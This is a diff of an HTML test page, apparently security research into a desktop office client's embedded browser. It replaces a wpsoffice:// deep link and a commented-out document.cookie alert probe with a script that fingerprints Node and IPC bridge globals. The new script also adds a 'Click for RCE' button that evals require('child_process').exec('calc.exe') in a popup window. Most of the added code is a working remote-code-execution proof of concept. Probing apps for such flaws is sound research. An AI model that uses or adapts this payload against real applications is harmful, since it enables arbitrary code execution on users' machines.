@@ -1,13 +1,36 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>File Upload Form</title>
-</head>
-<body>
-    <a href="wpsoffice://wps.cn/handle_req/utils/openWeb?web_url=https%3A%2F%2Fclientweb.docer.wps.cn%2Fresume-mobile-app%2Fmobile%2Findex.html%3FtitleStyle%3D0%26hideShareButton%3D1%23%2F">wps1</a>
-    <br>
-</body>
-</html>
-<!-- <script>alert(document.cookie);</script> -->
+ <!DOCTYPE html>
+ <html>
+ <head><meta charset="UTF-8"><title>test</title></head>
+ <body>
+ <script>
+ // 探测环境
+ var info = [];
+ info.push('require: ' + typeof require);
+ info.push('process: ' + typeof process);
+ info.push('window.open: ' + typeof window.open);
+ info.push('location: ' + location.protocol);
+
+ // 找所有全局对象
+ var keys = Object.keys(window).filter(function(k) {
+     return k.startsWith('__') || k.startsWith('ipc') || k.includes('bridge') || k.includes('gateway');
+ });
+ info.push('bridge keys: ' + (keys.length ? keys.join(',') : 'none'));
+
+ document.body.innerHTML = '<pre>' + info.join('\n') + '</pre>';
+
+ // 如果有人点击按钮，尝试 RCE
+ document.body.innerHTML += '<br><button onclick="rce()" style="font-size:30px;padding:20px">Click for RCE</button>';
+
+ function rce() {
+     var w = window.open('about:blank');
+     if (w) {
+         setTimeout(function() {
+             w.eval("require('child_process').exec('calc.exe')");
+         }, 500);
+     } else {
+         alert('window.open 返回 null，popup blocker 拦截');
+     }
+ }
+ </script>
+ </body>
+ </html>
